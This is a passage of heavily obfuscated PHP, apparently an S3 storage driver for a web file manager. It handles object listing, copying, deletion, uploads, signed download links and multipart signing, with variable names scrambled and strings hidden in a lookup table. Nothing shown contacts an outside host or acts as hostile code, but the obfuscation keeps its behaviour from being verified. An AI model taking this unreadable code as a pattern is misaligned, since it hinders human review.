$Ï§šø“[12] : $Ğ²™èÖ‡; $ĞÍøµ¨¨ = substr($æÚÖí, 0, strlen($æÚÖí) - strlen($Ğ²™èÖ‡)); $ç‘×ÄÉ = $ĞÍøµ¨¨ . "\x28\60\x29{$Ğ²™èÖ‡}"; for ($ú…÷¥ = 1; $ú…÷¥ <= count($õ†‹†Ñ) + 1; $ú…÷¥++) { $ç‘×ÄÉ = $ĞÍøµ¨¨ . "\50{$ú…÷¥}\51{$Ğ²™èÖ‡}"; if (!in_array_not_case($ç‘×ÄÉ, $õ†‹†Ñ)) { return $ç‘×ÄÉ; } } return $ç‘×ÄÉ; } public function listAllFiles($³’ äî•, $“šä²) { $â”º©³Ÿ =& $_SERVER[Ùæõ‰Ï’]; if (empty($“šä²)) { return array(); } $›Ò‹Ìˆº = array_keys($“šä²); $ã˜Ê–àÀ = array(); $³’ äî• = trim($³’ äî•, $â”º©³Ÿ[8]); foreach ($“šä² as $ÌáŞ–Ò => $²­£‘Ê) { $³‹Øó’§ = ltrim(substr(trim($ÌáŞ–Ò, $â”º©³Ÿ[8]), strlen($³’ äî•)), $â”º©³Ÿ[8]); if (substr($ÌáŞ–Ò, -1) == $â”º©³Ÿ[8]) { $³‹Øó’§ = rtrim($³‹Øó’§, $â”º©³Ÿ[8]) . $â”º©³Ÿ[8]; } $ã˜Ê–àÀ = array_merge($ã˜Ê–àÀ, $this->slicePath($³‹Øó’§)); } $¢Ñ‚İ÷Ü = array(); foreach (array_unique($ã˜Ê–àÀ) as $ìë´ÁÃÜ) { $¢é¼¬ˆ‡ = array($â”º©³Ÿ[87] => $this->getPathOuter($â”º©³Ÿ[8] . $³’ äî• . $â”º©³Ÿ[8] . $ìë´ÁÃÜ), $â”º©³Ÿ[78] => 1, $â”º©³Ÿ[79] => 0); if (substr($ìë´ÁÃÜ, -1) != $â”º©³Ÿ[8]) { $¢é¼¬ˆ‡[$â”º©³Ÿ[78]] = 0; $Ÿ»éÌŒ± = $this->getPath($³’ äî• . $â”º©³Ÿ[8] . $ìë´ÁÃÜ); if (isset($“šä²[$Ÿ»éÌŒ±])) { $õÉİ÷¡Š = $“šä²[$Ÿ»éÌŒ±]; if (isset($õÉİ÷¡Š[$â”º©³Ÿ[79]])) { $¢é¼¬ˆ‡[$â”º©³Ÿ[79]] = intval($õÉİ÷¡Š[$â”º©³Ÿ[79]]); } if (isset($õÉİ÷¡Š[$â”º©³Ÿ[206]])) { $¢é¼¬ˆ‡[$â”º©³Ÿ[88]] = intval($õÉİ÷¡Š[$â”º©³Ÿ[206]]); } } } $¢Ñ‚İ÷Ü[] = $¢é¼¬ˆ‡; } return $¢Ñ‚İ÷Ü; } public function slicePath($È‡ƒîÓ„) { $öÙ”ëÛ  =& $_SERVER[Ùæõ‰Ï’]; $øğÚìÌ = explode($öÙ”ëÛ [8], trim($È‡ƒîÓ„, $öÙ”ëÛ [8])); $ÍÍæƒä = 0; do { ++$ÍÍæƒä; $¯§àƒ©[] = implode($öÙ”ëÛ [8], array_slice($øğÚìÌ, 0, $ÍÍæƒä)) . $öÙ”ëÛ [8]; } while ($ÍÍæƒä < count($øğÚìÌ)); $¯§àƒ©[count($øğÚìÌ) - 1] = $È‡ƒîÓ„; return $¯§àƒ©; } public function getHost() { $ÛôÛ¥½Ñ =& $_SERVER[Ùæõ‰Ï’]; $â†Ãˆ¨ü = parse_url(trim($this->domain, $ÛôÛ¥½Ñ[8])); $Ø¶æùê = isset($â†Ãˆ¨ü[$ÛôÛ¥½Ñ[207]]) ? $â†Ãˆ¨ü[$ÛôÛ¥½Ñ[207]] : http_type(); $®ñâ¬º£ = isset($â†Ãˆ¨ü[$ÛôÛ¥½Ñ[208]]) ? $â†Ãˆ¨ü[$ÛôÛ¥½Ñ[208]] : $â†Ãˆ¨ü[$ÛôÛ¥½Ñ[87]]; if (isset($â†Ãˆ¨ü[$ÛôÛ¥½Ñ[209]])) { $®ñâ¬º£ .= $ÛôÛ¥½Ñ[4] . $â†Ãˆ¨ü[$ÛôÛ¥½Ñ[209]]; } return $Ø¶æùê . $ÛôÛ¥½Ñ[210] . $®ñâ¬º£; } public function pathEncode($ô´ÁôáÁ) { $½‡ØŸôş =& $_SERVER[Ùæõ‰Ï’]; return str_replace($½‡ØŸôş[211], $½‡ØŸôş[8], rawurlencode($ô´ÁôáÁ)); } public function writeLog($ï‡ÒÁ¬Ô = '', $Ï¾‚öÀÆ = false) { $“ãÏïÇ =& $_SERVER[Ùæõ‰Ï’]; $†¼¸ı = in_array(ACTION, array($“ãÏïÇ[212], $“ãÏïÇ[213])); if (!$†¼¸ı && !GLOBAL_DEBUG) { return; } $Ÿ·–¥ôæ = $ï‡ÒÁ¬Ô; static $Œíöã›ò = null; if (!$Œíöã›ò) { $Œíöã›ò = strtoupper($this->getType()); } $ï‡ÒÁ¬Ô = $Œíöã›ò . $“ãÏïÇ[214] . $ï‡ÒÁ¬Ô; if ($Ï¾‚öÀÆ) { $ßéáºÌä = error_get_last(); if ($ßéáºÌä) { $ï‡ÒÁ¬Ô = array($ï‡ÒÁ¬Ô, $ßéáºÌä); } } write_log($ï‡ÒÁ¬Ô, $“ãÏïÇ[215]); if ($†¼¸ı) { throw new Exception($Ÿ·–¥ôæ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Óˆ­°ñ£) { set_timeout(); require_once SDK_DIR . $_SERVER[Ùæõ‰Ï’][216]; parent::__construct(); $this->_init($Óˆ­°ñ£); } public function _init($Ó©Ÿˆ¹Õ) { $Üëæ¡µå =& $_SERVER[Ùæõ‰Ï’]; $this->config = $Ó©Ÿˆ¹Õ; foreach ($Ó©Ÿˆ¹Õ as $øÃ Áıå => $œ‡•’şá) { if (isset($this->{$øÃ Áıå})) { $this->{$øÃ Áıå} = $œ‡•’şá; } } $this->endpoint = $Ó©Ÿˆ¹Õ[$Üëæ¡µå[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($Üëæ¡µå[212], $Üëæ¡µå[213]))) { $this->client->setExceptions(); } } public function setSignVersion($Û–ˆñªØ = "\x76\64") { $this->signVer = $Û–ˆñªØ; $this->client->setSignatureVersion($Û–ˆñªØ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $òò¹Ê¶‹) { return null; } } public function isBucketCors() { $µø½Ûó· =& $_SERVER[Ùæõ‰Ï’]; $àµÜİÙ” = $this->getBucketCors(); if (!$àµÜİÙ” || !is_array($àµÜİÙ”)) { return !1; } if (!is_array($àµÜİÙ”[$µø½Ûó·[218]])) { $àµÜİÙ”[$µø½Ûó·[218]] = explode($µø½Ûó·[50], $àµÜİÙ”[$µø½Ûó·[218]]); } if ($àµÜİÙ”[$µø½Ûó·[219]] != $µø½Ûó·[220] || !in_array($µø½Ûó·[220], $àµÜİÙ”[$µø½Ûó·[218]])) { return !1; } $Á“½¹‰ = array_map($µø½Ûó·[221], $àµÜİÙ”[$µø½Ûó·[222]]); if (!is_array($Á“½¹‰)) { $Á“½¹‰ = array(); } $Á¸†¥£  = array($µø½Ûó·[223], $µø½Ûó·[224], $µø½Ûó·[225], $µø½Ûó·[226], $µø½Ûó·[227]); $ÑÌÔœÓ“ = array_diff($Á¸†¥£ , $Á“½¹‰); return empty($ÑÌÔœÓ“); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Ü†˜ëòï, $ƒÙˆ’Õà = '', $€½‹âÑƒ = REPEAT_RENAME) { $û»¦­Ùş = $this->setContent($Ü†˜ëòï, $ƒÙˆ’Õà); if ($û»¦­Ùş !== !1) { return $this->getPathOuter($Ü†˜ëòï); } return !1; } public function mkdir($‰°³’î†, $š‘±˜ú = REPEAT_SKIP) { $ÛÚ¨ã =& $_SERVER[Ùæõ‰Ï’]; if (empty($‰°³’î†) && $‰°³’î† !== $ÛÚ¨ã[228]) { return !1; } if ($š‘±˜ú && $this->_isFolder($‰°³’î†)) { return $this->getPathOuter($‰°³’î†); } $ûË•¼ûÆ = $this->setContent($‰°³’î†, $ÛÚ¨ã[12], !0); if ($ûË•¼ûÆ !== !1) { return $this->getPathOuter($‰°³’î†); } return !1; } public function copyFile($€ñô¤àâ, $ö÷ÑËÊ¿, $¾£•¤ù„ = array()) { $­’®Å =& $_SERVER[Ùæõ‰Ï’]; $Ô¶©¹¸Ø = $this->objectMeta($€ñô¤àâ); if (!$Ô¶©¹¸Ø) { return !1; } if ($Ô¶©¹¸Ø[$­’®Å[79]] <= 1024 * 1024 * 200) { $‹š”™®© = $this->client->copyObject($this->bucket, $€ñô¤àâ, $this->bucket, $ö÷ÑËÊ¿, $­’®Å[229], $¾£•¤ù„); } else { $‹š”™®© = $this->client->multiCopyObject($this->bucket, $€ñô¤àâ, $this->bucket, $ö÷ÑËÊ¿, $¾£•¤ù„); } $‹š”™®© = $‹š”™®© ? $this->getPathOuter($ö÷ÑËÊ¿) : !1; return $‹š”™®©; } public function moveFile($Îö²ÄÊæ, $è±´‘’¾) { if ($this->copyFile($Îö²ÄÊæ, $è±´‘’¾)) { $this->delFile($Îö²ÄÊæ); return $this->getPathOuter($è±´‘’¾); } return !1; } public function delFile($ƒ…¼è¶ƒ) { return $this->client->deleteObject($this->bucket, $ƒ…¼è¶ƒ); } public function delFolder($­ğú¶ŸÄ) { $€Ö˜¨ª =& $_SERVER[Ùæõ‰Ï’]; if (!$this->exist($­ğú¶ŸÄ)) { return !0; } $this->listItemCache = !1; $«®ã¯µ = $this->fileList($­ğú¶ŸÄ); $this->listItemCache = !0; $Êúú‚î = trim($­ğú¶ŸÄ, $€Ö˜¨ª[8]) . $€Ö˜¨ª[8]; if (!empty($­ğú¶ŸÄ) && $­ğú¶ŸÄ !== $€Ö˜¨ª[228] && !in_array($Êúú‚î, $«®ã¯µ[$€Ö˜¨ª[85]])) { $«®ã¯µ[$€Ö˜¨ª[85]][] = $Êúú‚î; } $•ûÖ’‰¿ = $this->delByBatch($«®ã¯µ[$€Ö˜¨ª[86]]); if (!$•ûÖ’‰¿) { return !1; } $•ûÖ’‰¿ = $this->delByBatch($«®ã¯µ[$€Ö˜¨ª[85]]); if (!$•ûÖ’‰¿) { return !1; } return $this->delFile($Êúú‚î); } private function delByBatch($ €íğİÓ) { foreach (array_chunk($ €íğİÓ, 1000) as $ìºğà) { $±Í‚Â–À = $this->client->deleteObjects($this->bucket, $ìºğà); if (!$±Í‚Â–À) { return !1; } } return !0; } public function rename($Ñ¢Ôº², $œ­­Êûˆ) { return $this->renameObject($Ñ¢Ôº², $œ­­Êûˆ); } public function listPath($‚İ’êŠú, $âÌôĞøœ = false) { $¤Ÿ¸Ò©­ =& $_SERVER[Ùæõ‰Ï’]; $ÂìêÄÄ¯ = $this->fileList($‚İ’êŠú, $¤Ÿ¸Ò©­[8], !0); foreach ($ÂìêÄÄ¯[$¤Ÿ¸Ò©­[85]] as $¸é·Éë³ => $ìôÙ¾ÇÁ) { $ÂìêÄÄ¯[$¤Ÿ¸Ò©­[85]][$¸é·Éë³] = $this->folderInfo($ìôÙ¾ÇÁ, $âÌôĞøœ, $ìôÙ¾ÇÁ); } foreach ($ÂìêÄÄ¯[$¤Ÿ¸Ò©­[86]] as $¸é·Éë³ => $ìôÙ¾ÇÁ) { $ÂìêÄÄ¯[$¤Ÿ¸Ò©­[86]][$¸é·Éë³] = $this->fileInfo($ìôÙ¾ÇÁ[$¤Ÿ¸Ò©­[32]], $âÌôĞøœ, $ìôÙ¾ÇÁ); } return $ÂìêÄÄ¯; } protected function infoChildren($¡†’ÍÒ , &$É÷‹Ç¦ƒ) { $½í–éæÛ =& $_SERVER[Ùæõ‰Ï’]; $»ÒÁå×Ş = $this->fileList($¡†’ÍÒ , $½í–éæÛ[12], !0); $É÷‹Ç¦ƒ[$½í–éæÛ[81]] += count($»ÒÁå×Ş[$½í–éæÛ[85]]); $É÷‹Ç¦ƒ[$½í–éæÛ[80]] += count($»ÒÁå×Ş[$½í–éæÛ[86]]); foreach ($»ÒÁå×Ş[$½í–éæÛ[86]] as $İ½ÍŸ³…) { if (!$İ½ÍŸ³… || !$İ½ÍŸ³…[$½í–éæÛ[79]]) { continue; } $É÷‹Ç¦ƒ[$½í–éæÛ[79]] += $İ½ÍŸ³…[$½í–éæÛ[79]]; } } private function fileInfo($ğ¾¯ÉØá, $ùÔÊ¯ùè = false, $››ÈÚŸĞ = array()) { $­ÌáüÍ˜ =& $_SERVER[Ùæõ‰Ï’]; $Æ¢ÉÂ¡ü = array($­ÌáüÍ˜[32] => $this->pathThis($ğ¾¯ÉØá), $­ÌáüÍ˜[87] => $this->getPathOuter($ğ¾¯ÉØá), $­ÌáüÍ˜[33] => $­ÌáüÍ˜[230], $­ÌáüÍ˜[169] => $this->ext($ğ¾¯ÉØá), $­ÌáüÍ˜[79] => isset($››ÈÚŸĞ[$­ÌáüÍ˜[79]]) ? $››ÈÚŸĞ[$­ÌáüÍ˜[79]] : 0); if ($ùÔÊ¯ùè) { return $Æ¢ÉÂ¡ü; } $Æ¢ÉÂ¡ü[$­ÌáüÍ˜[231]] = $Æ¢ÉÂ¡ü[$­ÌáüÍ˜[88]] = 0; $Æ¢ÉÂ¡ü[$­ÌáüÍ˜[232]] = $Æ¢ÉÂ¡ü[$­ÌáüÍ˜[233]] = !0; if (empty($››ÈÚŸĞ)) { $››ÈÚŸĞ = $this->objectMeta($ğ¾¯ÉØá); if (!$››ÈÚŸĞ) { return $Æ¢ÉÂ¡ü; } } if (isset($››ÈÚŸĞ[$­ÌáüÍ˜[234]]) && $››ÈÚŸĞ[$­ÌáüÍ˜[234]]) { $Æ¢ÉÂ¡ü[$­ÌáüÍ˜[235]] = $››ÈÚŸĞ[$­ÌáüÍ˜[234]]; } if (isset($››ÈÚŸĞ[$­ÌáüÍ˜[206]])) { $Æ¢ÉÂ¡ü[$­ÌáüÍ˜[88]] = $››ÈÚŸĞ[$­ÌáüÍ˜[206]]; } if (isset($››ÈÚŸĞ[$­ÌáüÍ˜[79]])) { $Æ¢ÉÂ¡ü[$­ÌáüÍ˜[79]] = $››ÈÚŸĞ[$­ÌáüÍ˜[79]]; } return $Æ¢ÉÂ¡ü; } private function folderInfo($¯ğÜßÒ, $¸É³ë±æ = false, $¿ÆôÈ÷¬ = array()) { $ÊêŒ„ò× =& $_SERVER[Ùæõ‰Ï’]; $‡÷úÑ†Ô = array($ÊêŒ„ò×[32] => $this->pathThis($¯ğÜßÒ), $ÊêŒ„ò×[87] => $this->getPathOuter($ÊêŒ„ò×[8] . $¯ğÜßÒ), $ÊêŒ„ò×[33] => $ÊêŒ„ò×[78]); if ($¸É³ë±æ) { return $‡÷úÑ†Ô; } $‡÷úÑ†Ô[$ÊêŒ„ò×[231]] = $‡÷úÑ†Ô[$ÊêŒ„ò×[88]] = 0; $‡÷úÑ†Ô[$ÊêŒ„ò×[232]] = $‡÷úÑ†Ô[$ÊêŒ„ò×[233]] = !0; if ($¯ğÜßÒ == $ÊêŒ„ò×[12]) { return $‡÷úÑ†Ô; } if (empty($¿ÆôÈ÷¬)) { $¿ÆôÈ÷¬ = $this->objectMeta(trim($¯ğÜßÒ, $ÊêŒ„ò×[8]) . $ÊêŒ„ò×[8]); } if (isset($¿ÆôÈ÷¬[$ÊêŒ„ò×[206]])) { $‡÷úÑ†Ô[$ÊêŒ„ò×[231]] = $¿ÆôÈ÷¬[$ÊêŒ„ò×[206]]; } return $‡÷úÑ†Ô; } private function fileList($±¹““Ó, $¨Ô¤áÛ£ = '', $Â½œ£„ = 0) { $ûû£œ‡ =& $_SERVER[Ùæõ‰Ï’]; $Â‹¨òåú = rtrim($±¹““Ó, $ûû£œ‡[8]) . $ûû£œ‡[8]; $¡÷×›Ç÷ = $this->listObjs($Â‹¨òåú, null, null, $¨Ô¤áÛ£); if (!$¡÷×›Ç÷) { return array($ûû£œ‡[85] => array(), $ûû£œ‡[86] => array()); } $¬¬ä™ = $ÈÛşúá = array(); foreach ($¡÷×›Ç÷[$ûû£œ‡[236]] as $»ùÉëÖ½) { $Ï—ÊĞçÛ = $»ùÉëÖ½[$ûû£œ‡[32]]; if ($Ï—ÊĞçÛ == $Â‹¨òåú) { continue; } $€Óûæ´å = isset($»ùÉëÖ½[$ûû£œ‡[79]]) ? $»ùÉëÖ½[$ûû£œ‡[79]] : 0; $Æ­¢•À‚ = $€Óûæ´å == 0 && substr($Ï—ÊĞçÛ, strlen($Ï—ÊĞçÛ) - 1, 1) == $ûû£œ‡[8] ? !0 : !1; $this->cacheMethodInfoSet($Ï—ÊĞçÛ, $Æ­¢•À‚, $»ùÉëÖ½); if ($Æ­¢•À‚) { $¬¬ä™[] = $Ï—ÊĞçÛ; continue; } $ÈÛşúá[] = $Â½œ£„ ? $»ùÉëÖ½ : $Ï—ÊĞçÛ; } foreach ($¡÷×›Ç÷[$ûû£œ‡[237]] as $»ùÉëÖ½) { $¬¬ä™[] = $»ùÉëÖ½[$ûû£œ‡[32]]; $this->cacheMethodInfoSet($»ùÉëÖ½[$ûû£œ‡[32]], !0); } $this->cacheMethodInfoSet($±¹““Ó, !0); return array($ûû£œ‡[85] => $¬¬ä™, $ûû£œ‡[86] => $ÈÛşúá); } private function listObjs($‹˜³ª¿ , $å€–ÁÊ = null, $ä’ó‹À = null, $—ëÈöú = null) { $¤Óà™š» =& $_SERVER[Ùæõ‰Ï’]; $‹˜³ª¿  = trim($‹˜³ª¿ , $¤Óà™š»[8]); $ÓÀØ€æ = empty($‹˜³ª¿ ) && $‹˜³ª¿  !== $¤Óà™š»[228] ? $¤Óà™š»[12] : $‹˜³ª¿  . $¤Óà™š»[8]; return $this->client->getBucket($this->bucket, $ÓÀØ€æ, $å€–ÁÊ, $ä’ó‹À, $—ëÈöú, !0); } public function has($–Ü‡ıÛÑ, $³Ñ–Ì“¢ = false, $³÷å÷Ä‘ = true) { $‹ö¹•ŸÛ =& $_SERVER[Ùæõ‰Ï’]; $–Ü‡ıÛÑ = trim($–Ü‡ıÛÑ, $‹ö¹•ŸÛ[8]); $Á™·‚İ¤ = empty($–Ü‡ıÛÑ) && $–Ü‡ıÛÑ !== $‹ö¹•ŸÛ[228] ? $‹ö¹•ŸÛ[12] : $–Ü‡ıÛÑ . $‹ö¹•ŸÛ[8]; $˜ºÁ°ÁÅ = null; $ƒÛµ¤šÇ = 500; $¯‚µÉ·Ñ = $‹ö¹•ŸÛ[8]; $¢’¥ôÍÎ = $ğŞŞÀ­« = array(); while (!0) { $ù™Êè‚ = $this->listObjs($–Ü‡ıÛÑ, $˜ºÁ°ÁÅ, $ƒÛµ¤šÇ, $¯‚µÉ·Ñ); if (!$ù™Êè‚) { break; } $˜ºÁ°ÁÅ = $ù™Êè‚[$‹ö¹•ŸÛ[238]]; $ì‚¿Ú† = $ù™Êè‚[$‹ö¹•ŸÛ[236]]; $ØÂö½äş = $ù™Êè‚[$‹ö¹•ŸÛ[237]]; if (empty($ì‚¿Ú†) && empty($ØÂö½äş)) { break; } if (count($ì‚¿Ú†) == 1 && $ì‚¿Ú†[0][$‹ö¹•ŸÛ[32]] == $Á™·‚İ¤) { break; } if ($³Ñ–Ì“¢) { if (count($ì‚¿Ú†)) { $ì‚¿Ú† = array_column($ì‚¿Ú†, $‹ö¹•ŸÛ[32]); $¢’¥ôÍÎ = array_merge($¢’¥ôÍÎ, $ì‚¿Ú†); } if (count($ØÂö½äş)) { $ØÂö½äş = array_column($ØÂö½äş, $‹ö¹•ŸÛ[32]); $ğŞŞÀ­« = array_merge($ğŞŞÀ­«, $ØÂö½äş); } if ($˜ºÁ°ÁÅ === null) { break; } continue; } if ($³÷å÷Ä‘) { if (!empty($ì‚¿Ú†)) { if (count($ì‚¿Ú†) > 1 || isset($ì‚¿Ú†[0][$‹ö¹•ŸÛ[32]]) && $ì‚¿Ú†[0][$‹ö¹•ŸÛ[32]] != $Á™·‚İ¤) { return !0; } } } else { if (!empty($ØÂö½äş)) { return !0; } } if ($˜ºÁ°ÁÅ === null) { break; } } if ($³Ñ–Ì“¢) { $¢’¥ôÍÎ = array_diff($¢’¥ôÍÎ, array($Á™·‚İ¤)); $¢’¥ôÍÎ = count(array_unique($¢’¥ôÍÎ)); $ğŞŞÀ­« = count(array_unique($ğŞŞÀ­«)); return array($‹ö¹•ŸÛ[239] => $¢’¥ôÍÎ, $‹ö¹•ŸÛ[240] => $ğŞŞÀ­«); } return !1; } public function listAll($¿”‘ª) { $ñŞù‘½ı =& $_SERVER[Ùæõ‰Ï’]; $‘¶€‰¹Ë = $this->fileList($¿”‘ª, $ñŞù‘½ı[12], !0); $äã¢Şµ = array_to_keyvalue($‘¶€‰¹Ë[$ñŞù‘½ı[86]], $ñŞù‘½ı[32]); foreach ($‘¶€‰¹Ë[$ñŞù‘½ı[85]] as $‰½ËÃï±) { if (is_string($‰½ËÃï±)) { $äã¢Şµ[$‰½ËÃï±] = array($ñŞù‘½ı[79] => 0); } } return $this->listAllFiles($¿”‘ª, $äã¢Şµ); } public function canRead($­›ë“¡¯) { $şêßçÓ¬ =& $_SERVER[Ùæõ‰Ï’]; $‡¼ë“à‡ = $this->client->getAccessControlPolicy($this->bucket, $­›ë“¡¯); if (!$‡¼ë“à‡) { return !1; } return in_array($‡¼ë“à‡, array($şêßçÓ¬[241], $şêßçÓ¬[242], $şêßçÓ¬[243])) ? !0 : !1; } public function canWrite($÷¢ÌÓêÁ) { $½şöÅ¿Ä =& $_SERVER[Ùæõ‰Ï’]; $çº¿Â¯ = $this->client->getAccessControlPolicy($this->bucket, $÷¢ÌÓêÁ); if (!$çº¿Â¯) { return !1; } return in_array($çº¿Â¯, array($½şöÅ¿Ä[241], $½şöÅ¿Ä[242])) ? !0 : !1; } public function getContent($ÁõƒË«) { return $this->client->getObject($this->bucket, $ÁõƒË«); } public function setContent($¸Ìêåùâ, $ó©º’šÙ = '', $Ä–˜òÆ× = false) { $×Ëîá‹ =& $_SERVER[Ùæõ‰Ï’]; $¸Ìêåùâ = $Ä–˜òÆ× ? trim($¸Ìêåùâ, $×Ëîá‹[8]) . $×Ëîá‹[8] : $¸Ìêåùâ; $«¨íüÓç = get_file_mime(get_path_ext($¸Ìêåùâ)); $Œ˜­ùĞÊ = $this->client->putObject($ó©º’šÙ, $this->bucket, $¸Ìêåùâ, $×Ëîá‹[229], array(), $«¨íüÓç); if (!$Œ˜­ùĞÊ) { return !1; } if ($Ä–˜òÆ×) { return !0; } return $Œ˜­ùĞÊ ? !0 : !1; } public function fileSubstr($–ëîß, $Ã…ñ§, $ä•é†§·) { $ÚÑéãñ = $Ã…ñ§ + $ä•é†§· - 1; return $this->client->getObject($this->bucket, $–ëîß, array($_SERVER[Ùæõ‰Ï’][244] => "\142\171\x74\145\x73\x3d{$Ã…ñ§}\x2d{$ÚÑéãñ}")); } public function upload($³Ù“öàƒ, $®¨Š»õ¶, $ëŸ˜ÁÌµ = false, $ÒÚ Êù… = REPEAT_REPLACE) { $³÷ÃÉÚê =& $_SERVER[Ùæõ‰Ï’]; $²¹ù¼ì = array($³÷ÃÉÚê[245] => @md5_file($®¨Š»õ¶)); $ÛË°©§ê = array($³÷ÃÉÚê[246] => get_file_mime(get_path_ext($³Ù“öàƒ))); if (IO::size($®¨Š»õ¶) <= 1024 * 1024 * 200) { $¤—…³¸ = $this->client->putObjectFile($®¨Š»õ¶, $this->bucket, $³Ù“öàƒ, $³÷ÃÉÚê[229], $²¹ù¼ì, $ÛË°©§ê); return !empty($¤—…³¸) ? $this->getPathOuter($³Ù“öàƒ) : !1; } $«ø¥ø‘ = $this->client->multiUploadObject($®¨Š»õ¶, $this->bucket, trim($³Ù“öàƒ, $³÷ÃÉÚê[8]), $²¹ù¼ì, $ÛË°©§ê); return $«ø¥ø‘ ? $this->getPathOuter($³Ù“öàƒ) : !1; } public function download($ÙÕ¥øÕè, $Èé¯¾¾º) { if (!@is_dir($this->pathFather($Èé¯¾¾º)) && !IO::mkdir($this->pathFather($Èé¯¾¾º))) { return !1; } $Ïš±ÁåÒ = $this->client->getObject($this->bucket, $ÙÕ¥øÕè, array(), $Èé¯¾¾º); return $Ïš±ÁåÒ !== !1 ? $Èé¯¾¾º : !1; } public function link($¥ÅÙÏ°–, $­ªá…„œ = array()) { $Ô“®Á—Ö =& $_SERVER[Ùæõ‰Ï’]; if ($this->signVer == $Ô“®Á—Ö[247]) { return $this->client->getAuthenticatedURL($this->bucket, $¥ÅÙÏ°–, 3600 * 12, $­ªá…„œ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¥ÅÙÏ°–, $Ô“®Á—Ö[8]), 3600 * 12, $this->region, array(), !0, $­ªá…„œ); } public function fileOut($ÎÏñŞŞå, $âÀªğÉ¸ = false, $¥ÄËÔíƒ = false, $Å½¦ô = '') { $ôÓÈŞË =& $_SERVER[Ùæõ‰Ï’]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÎÏñŞŞå, $âÀªğÉ¸, $¥ÄËÔíƒ, $Å½¦ô); } if (!$¥ÄËÔíƒ) { $¥ÄËÔíƒ = $this->pathThis($ÎÏñŞŞå); } $®†¤™Ìó = get_file_mime(get_path_ext($¥ÄËÔíƒ)); if ($®†¤™Ìó == $ôÓÈŞË[248]) { return parent::fileOut($ÎÏñŞŞå, $âÀªğÉ¸, $¥ÄËÔíƒ, $Å½¦ô); } $ò‹ö„Ôï = array($ôÓÈŞË[249] => $®†¤™Ìó); if ($âÀªğÉ¸) { $ò‹ö„Ôï[$ôÓÈŞË[250]] = $ôÓÈŞË[251] . rawurlencode($¥ÄËÔíƒ); } else { } $«Ä­£¶í = $this->link($ÎÏñŞŞå, $ò‹ö„Ôï); $this->fileOutLink($«Ä­£¶í); } public function fileOutServer($Åó³ìê, $ˆï¯ªµ› = false, $æ¤®Ã = false, $İ±Ë†¾¨ = '') { parent::fileOut($Åó³ìê, $ˆï¯ªµ›, $æ¤®Ã, $İ±Ë†¾¨); } public function fileOutImageServer($¥’Œ‹¶°, $ú¡³„³Ó = 250) { parent::fileOutImage($¥’Œ‹¶°, $ú¡³„³Ó); } public function hashMd5($ÕøÅİ€Ë, $ï¹ˆ¦ŸŞ = '') { $‚ğ‡”ô = $this->objectMeta($ÕøÅİ€Ë); if (!$‚ğ‡”ô) { return !1; } $ï¹ˆ¦ŸŞ = $ï¹ˆ¦ŸŞ ? $ï¹ˆ¦ŸŞ : _get($‚ğ‡”ô, $_SERVER[Ùæõ‰Ï’][252]); return $ï¹ˆ¦ŸŞ; } public function uploadFormData($Ô“Ÿ““½, $Û“ô•ù´ = 3600) { $ì¤¾‡¿‡ =& $_SERVER[Ùæõ‰Ï’]; $§şğ¸ñ× = $this->pathFather($Ô“Ÿ““½); $ûÒ²öª¾ = $this->client->getHttpUploadPostParams($this->bucket, $§şğ¸ñ×, $ì¤¾‡¿‡[229], $Û“ô•ù´); return array_merge((array) $ûÒ²öª¾, array($ì¤¾‡¿‡[208] => $this->getHost())); } public function multiUploadFormData($©äßà©Ê, $¿›¦´ÃÙ = 3600) { $ÇŠäéäÊ =& $_SERVER[Ùæõ‰Ï’]; $™Â‘Ù© = gmdate($ÇŠäéäÊ[253]); $ŠôÂ³§è = array(); $Ÿ¹‚÷Óõ = $this->client->getUploadId($this->bucket, $©äßà©Ê, $ŠôÂ³§è); if (!$Ÿ¹‚÷Óõ) { return !1; } return array($ÇŠäéäÊ[254] => $Ÿ¹‚÷Óõ, $ÇŠäéäÊ[208] => $this->getHost() . $ÇŠäéäÊ[8] . $this->pathEncode($©äßà©Ê), $ÇŠäéäÊ[255] => $™Â‘Ù©, $ÇŠäéäÊ[97] => $©äßà©Ê); } public function multiUploadAuthData($«öÓşæ, $åì²¤ó = array()) { $‘ø´ĞŠ’ =& $_SERVER[Ùæõ‰Ï’]; $‹Ê½î‚Í = isset($åì²¤ó[$‘ø´ĞŠ’[255]]) ? $åì²¤ó[$‘ø´ĞŠ’[255]] : gmdate($‘ø´ĞŠ’[253]); $·â˜©›é = isset($åì²¤ó[$‘ø´ĞŠ’[169]]) ? $åì²¤ó[$‘ø´ĞŠ’[169]] : $‘ø´ĞŠ’[12]; $µíèÒê“ = $åì²¤ó[$‘ø´ĞŠ’[97]]; unset($åì²¤ó[$‘ø´ĞŠ’[97]]); if (isset($åì²¤ó[$‘ø´ĞŠ’[256]])) { $åì²¤ó[$‘ø´ĞŠ’[255]] = $‹Ê½î‚Í; return $this->listUploadParts($µíèÒê“, $åì²¤ó); } $µÙÀ³”É = array($‘ø´ĞŠ’[257], $‘ø´ĞŠ’[12], $‘ø´ĞŠ’[123], $‘ø´ĞŠ’[12], "\x78\x2d\141\155\x7a\55\x64\141\164\145\x3a{$‹Ê½î‚Í}", $‘ø´ĞŠ’[8] . $this->bucket . $‘ø´ĞŠ’[8] . $this->pathEncode($µíèÒê“) . $·â˜©›é); if (strpos($·â˜©›é, $‘ø´ĞŠ’[258]) === 0) { $µÙÀ³”É[0] = $‘ø´ĞŠ’[259]; } if (isset($åì²¤ó[$‘ø´ĞŠ’[260]]) && $åì²¤ó[$‘ø´ĞŠ’[260]] == $‘ø´ĞŠ’[261]) { $µÙÀ³”É[0] = $‘ø´ĞŠ’[261]; } $ÂßÒÚç = implode($‘ø´ĞŠ’[262], $µÙÀ³”É); $È¦Ş‰˜Ù = base64_encode(hash_hmac($‘ø´ĞŠ’[263], $ÂßÒÚç, $this->secret, !0)); 